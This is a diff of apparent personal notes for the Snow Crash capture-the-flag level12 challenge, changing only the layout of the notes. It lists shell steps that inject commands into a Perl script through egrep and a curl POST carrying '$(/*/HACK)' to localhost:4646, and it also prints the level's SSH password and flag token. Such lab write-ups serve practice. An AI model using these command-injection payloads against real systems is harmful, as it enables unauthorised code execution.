@@ -1,19 +1,25 @@
-🔻 Analyze
-⬇️ cat level12.pl
-👉 egrep "^$xx" /tmp/xd 2>&1
++ ---- 🔻 Analyze ----
+|
+|   cat level12.pl
+|   👉 egrep "^$xx" /tmp/xd 2>&1
+|
+|   egrep "$(pwd > /tmp/out)" /tmp/xd
+|   cat /tmp/out
+|
+|   echo "echo \$(getflag) > /tmp/flag" > /tmp/HACK
+|   chmod +x /tmp/HACK
+|   echo "$(/*/HACK)"
+|   cat /tmp/flag
+|
 
-⬇️ egrep "$(pwd > /tmp/out)" /tmp/xd
-⬇️ cat /tmp/out
 
-⬇️ echo "echo \$(getflag) > /tmp/flag" > /tmp/HACK
-⬇️ chmod +x /tmp/HACK
-⬇️ echo "$(/*/HACK)"
-⬇️ cat /tmp/flag
-
-
-🔻 Hack
-⬇️ echo "echo \$(getflag) > /tmp/flag12" > /tmp/HACK
-⬇️ chmod +x /tmp/HACK
-⬇️ curl -X POST -d 'x=$(/*/HACK)' localhost:4646
-⬇️ cat /tmp/flag12
-👉 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
++ ---- 🔻 Hack ----
+|
+|   ssh level12@$SNOW_CRASH_IP -p 4242
+|   └ fa6v5ateaw21peobuub8ipe6s
+|   echo "echo \$(getflag) > /tmp/flag12" > /tmp/HACK
+|   chmod +x /tmp/HACK
+|   curl -X POST -d 'x=$(/*/HACK)' localhost:4646
+|   cat /tmp/flag12
+|   👉 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+|
